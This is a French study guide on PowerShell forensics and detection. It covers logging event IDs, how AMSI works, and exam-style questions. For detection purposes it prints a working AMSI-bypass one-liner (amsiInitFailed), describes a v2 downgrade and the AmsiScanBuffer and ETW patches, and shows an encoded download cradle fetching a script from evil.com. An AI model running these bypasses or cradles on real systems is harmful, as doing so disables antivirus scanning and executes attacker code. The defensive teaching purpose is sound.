🔑 Pourquoi PowerShell est l'arme n°1 des attaquants modernes
PowerShell est installé par défaut sur tout Windows depuis 7/2008 R2, signé par Microsoft, intégré aux EDR comme outil légitime, capable d'exécuter du code en mémoire sans toucher le disque (fileless), et pré-configuré pour télécharger et exécuter des charges réseau (IEX, Net.WebClient, Invoke-WebRequest). C'est l'archétype du Living-off-the-Land Binary (LOLBin). Mappé sur MITRE ATT&CK T1059.001, c'est l'une des techniques d'exécution les plus fréquentes (Empire, PowerSploit, Nishang, Invoke-Mimikatz, Cobalt Strike beacons).

🔧 Registre / PowerShell direct
# ScriptBlock Logging
$p = 'HKLM:\SOFTWARE\Policies\Microsoft\
Windows\PowerShell\ScriptBlockLogging'
New-Item $p -Force
New-ItemProperty $p `
  -Name EnableScriptBlockLogging `
  -Value 1 -PropertyType DWord

# Module Logging
$p = '...PowerShell\ModuleLogging'
-Name EnableModuleLogging -Value 1
-Name '*' -PropertyType String
⚠️ Cache de session : les politiques de logging sont mises en cache au lancement de chaque runspace PowerShell. Une activation prend effet uniquement dans une nouvelle console — les sessions déjà ouvertes par un attaquant continuent à échapper au logging tant qu'elles vivent.
🎯 Les Event IDs PowerShell — par ordre d'utilité forensique
En investigation, l'EID 4104 est presque toujours la source primaire : il capture le texte complet du script block exécuté, de-obfusqué par le moteur PowerShell juste avant exécution. C'est la seule façon de voir le code que l'attaquant a réellement fait tourner — même si ce code n'a jamais touché le disque, même s'il a été reçu encodé en Base64, même s'il a été chiffré XOR.

🔍 Champs forensiques clés
  • ScriptBlockText — code de-obfusqué tel qu'exécuté
  • ScriptBlockId — identifiant unique pour réassembler les scripts longs (un ScriptBlockText par event, plusieurs events partagent le même Id)
  • UserID (SID) — corréler avec EID 4624 du Security log
  • ProcessID — corréler avec EID 4688 + Sysmon EID 1 pour la lignée de processus
  • Path — chemin du .ps1 si exécuté depuis fichier ; vide si -Command ou interactif

🛡 AMSI — Antimalware Scan Interface (Windows 10+)
AMSI est l'interface introduite avec Windows 10 (2015) qui permet à n'importe quelle application — PowerShell, JScript, VBScript, Office VBA, .NET — de soumettre du contenu à Microsoft Defender (ou tout AV compatible) avant exécution. Pour PowerShell, AMSI scanne chaque script block au moment où il est compilé, après dé-obfuscation. C'est le mécanisme qui permet à Defender de détecter Mimikatz/Empire/Cobalt Strike même quand ils sont exécutés en mémoire après plusieurs couches d'encodage.
Flux AMSI dans PowerShell
1. Code PowerShell entrant (-Command, fichier .ps1, IEX, pipeline distant, etc.)
↓
2. PowerShell de-obfusque le script block (Base64, XOR, ROT13, compression…)
↓
3. System.Management.Automation.AmsiUtils appelle AmsiScanBuffer() avec le code clair
↓
4a. ❌ Defender flag → script bloqué + EID 1116/1117 dans Defender/Operational + EID 4104 niveau Warning
4b. ✅ Pas de flag → script exécuté + EID 4104 niveau 5 (Verbose)
Techniques de bypass AMSI (à connaître pour la détection)
⚠️ Important : ces techniques sont documentées publiquement et utilisées par les attaquants depuis 2016. La connaissance de leurs traces forensiques est ce qui compte pour le DFIR — pas leur reproduction.
① Patch amsiInitFailed (le plus connu)
[Ref].Assembly.GetType('System.Management.
Automation.AmsiUtils').GetField('amsiInit
Failed','NonPublic,Static').SetValue($null,$true)
Trace : EID 4104 contenant amsiInitFailed ou AmsiUtils — chaîne directement signaturée par Defender depuis 2018, donc bloquée par AMSI elle-même → souvent obfusquée.
② Patch mémoire d'AmsiScanBuffer
Réécrit la première instruction d'amsi.dll!AmsiScanBuffer en mémoire (VirtualProtect + écriture xor eax,eax; ret) pour qu'elle retourne « clean » à chaque appel.
Trace : appel inhabituel à VirtualProtect sur amsi.dll visible en RAM (Volatility malfind) ou via Sysmon EID 7 (image load) + EID 10 (process access).
③ Downgrade vers PowerShell v2
powershell.exe -Version 2 -Command ...
PowerShell 2.0 n'a ni AMSI ni ScriptBlock Logging. Si la fonctionnalité .NET 3.5 est installée, l'attaquant peut forcer cette version.
Trace : EID 400 avec HostVersion=2.0 · EID 4688 avec -Version 2 en ligne de commande · ⚠️ désactiver PS v2 est la meilleure mitigation : Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
④ Hook ETW (couper les logs à la source)
Patch de EtwEventWrite pour empêcher PowerShell d'émettre les events 4103/4104 vers ETW → aucun log généré.
Trace : silence anormal — pas d'EID 4104 alors que powershell.exe a tourné selon Sysmon EID 1. Détection par corrélation, pas par signature.
🔣 Encoded Commands & Obfuscation
PowerShell accepte un argument -EncodedCommand (alias -Enc, -e) qui prend une chaîne Base64 d'une chaîne UTF-16 LE à exécuter. C'est un canal légitime de transmission de scripts (caractères spéciaux sur la ligne de commande), mais c'est aussi la technique d'obfuscation la plus utilisée par les attaquants car elle masque le code dans EID 4688 (process creation) et la ligne de commande.
Décodage manuel d'un payload encodé
# Ce qu'on voit dans EID 4688 / Sysmon EID 1 :
powershell.exe -nop -w hidden -ep bypass -Enc SQBFAFgAIAAoAE4AZQB3
    -QBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAEQA
    bwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwBlAHYA
    aQBsAC4AYwBvAG0ALwBwAC4AcABzADEAJwApAA==

# Décoder en PowerShell ou Python :
[System.Text.Encoding]::Unicode.GetString(
  [System.Convert]::FromBase64String($enc))

# Python alternative (CLI / cross-platform) :
$ echo "SQBFAFgA..." | base64 -d | iconv -f UTF-16LE -t UTF-8

# → résultat :
IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1')
💡 Bonne nouvelle : dans EID 4104, ce payload apparaîtra déjà décodé sous forme de ScriptBlockText en clair, parce que ScriptBlock Logging capture le code après de-obfuscation par le moteur PS. C'est pourquoi 4104 est l'artefact n°1 : pas besoin de décoder soi-même.
Couches d'obfuscation courantes
Technique Exemple Visible dans 4104 ?
Base64 -EncodedCommand SQBFAFg… ✅ décodé
String concat "I"+"E"+"X" · ('In'+'voke-Mim'+'ikatz') ⚠️ partiellement (texte concaténé visible)
Char codes [char]73 + [char]69 + [char]88 ⚠️ partiellement
Reverse string "XEI"[-1..-3] -join '' ⚠️ partiellement
XOR / compression XOR avec clé statique + Base64 ✅ décodé (PS de-obfusque avant exec)
Invoke-Obfuscation (Bohannon) framework de génération auto · 30+ tokens ⚠️ EID 4104 contient l'IL final mais souvent illisible
Reflective .NET load [Reflection.Assembly]::Load($bytes) 🔴 binaire chargé sans fichier · seul le wrapper PS est loggé
🎓 Le « download cradle » classique
Le pattern le plus fréquent en 2024-2026 reste le download cradle : IEX (New-Object Net.WebClient).DownloadString('http://<C2>/<stage>.ps1') Il signe quasiment tous les loaders (Lumma, RedLine, IcedID, Qakbot, LockBit affilié). Variantes : iwr (Invoke-WebRequest), Invoke-RestMethod, Start-BitsTransfer. Recherche SIEM minimale : EID=4104 AND ScriptBlockText CONTAINS "DownloadString".
🔧 Pipeline de détection PowerShell
La détection des PowerShell malveillants en 2026 repose sur trois couches : (1) collecte (ScriptBlock + Module + Transcription + Sysmon), (2) corrélation SIEM (Splunk/Elastic/Sentinel), (3) règles Sigma portables. Le tout enrichi par AMSI côté endpoint et EDR côté process.

Triade détection : 4688 + 4104 + Sysmon EID 1
⚡ Le combo gagnant : en investigation, corréler systématiquement ces trois événements horodatés à la milliseconde près :
  • EID 4688 (Security) → ligne de commande powershell.exe ... + parent process
  • Sysmon EID 1 (Sysmon/Operational) → hash SHA-256 + chemin + GUID processus + lignée parent (PPID, GPP)
  • EID 4104 (PowerShell/Operational) → texte du script de-obfusqué
Reconstruction : Sysmon EID 1 donne ce qui s'est lancé, 4688 donne la ligne de commande complète, 4104 donne ce qui a été exécuté. Sans cette triade, l'analyse PowerShell est incomplète.

🎓 Exam Tip — PowerShell forensique

Canal principal : Microsoft-Windows-PowerShell/Operational

EID 4104 = ScriptBlock Logging — code de-obfusqué · artefact n°1

EID 4103 = Module Logging — verbeux, pipelines, paramètres cmdlets

EID 400 = Engine start — révèle PowerShell v2 (HostVersion=2.0)

Activation : GPO ou registre HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging=1

AMSI = scan AV des script blocks après de-obfuscation · EID 1116/1117 (Defender)

Bypass classiques : amsiInitFailed · patch AmsiScanBuffer · downgrade PS v2 · hook ETW

Mitigation n°1 : Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root

Patterns à alerter : IEX · DownloadString · -Enc · amsiInitFailed · Invoke-Mimikatz · [Reflection.Assembly]::Load

MITRE : T1059.001 (PowerShell) · T1027 (Obfuscated Files) · T1562.001 (Disable Tools / AMSI bypass)

Triade IR : Sysmon EID 1 + Security EID 4688 + PS EID 4104 — corrélation horodatage

Pourquoi l'EID 4104 est-il considéré comme « l'artefact n°1 » alors qu'un attaquant a utilisé -EncodedCommand ?
PowerShell forensique · Niveau : moyen
Parce que ScriptBlock Logging capture le code après de-obfuscation par le moteur PowerShell, juste avant son exécution. Concrètement : un payload Base64 transmis via powershell.exe -Enc SQBFAFg… apparaîtra dans EID 4688 (process creation) sous sa forme encodée, mais l'EID 4104 contiendra dans ScriptBlockText le texte clair tel qu'exécuté par le runtime — par exemple IEX (New-Object Net.WebClient).DownloadString('http://evil.com/p.ps1'). Pas besoin de décoder soi-même. C'est aussi vrai pour les couches XOR, ROT13, compression, voire les obfuscations Invoke-Obfuscation : tout ce qui passe par le compilateur PS est journalisé en clair. Seules les exceptions : (1) PowerShell v2 (pas de 4104), (2) bypass AMSI/ETW qui coupent les logs à la source, (3) chargement réflectif de .NET (le binaire est exécuté hors compilation PS).
Lors d'une investigation, vous voyez Sysmon EID 1 montrant powershell.exe -Version 2 ... mais aucun EID 4104 correspondant dans Microsoft-Windows-PowerShell/Operational. Pourquoi ?
Downgrade attack · Niveau : facile
C'est un downgrade attack. PowerShell 2.0 ne supporte ni ScriptBlock Logging (introduit en v5), ni Module Logging (v3+), ni AMSI (v5 + Win10). En forçant -Version 2, l'attaquant exécute son code dans un runtime aveugle. Le seul vestige possible est l'EID 400 dans Windows PowerShell.evtx avec HostVersion=2.0, et la ligne de commande dans Security EID 4688 / Sysmon EID 1. Mitigation immédiate : désactiver la fonctionnalité optionnelle MicrosoftWindowsPowerShellV2Root (Disable-WindowsOptionalFeature ou via DISM). Cela retire l'engine v2 du système — à faire sur tout le parc, pas seulement les contrôleurs de domaine.
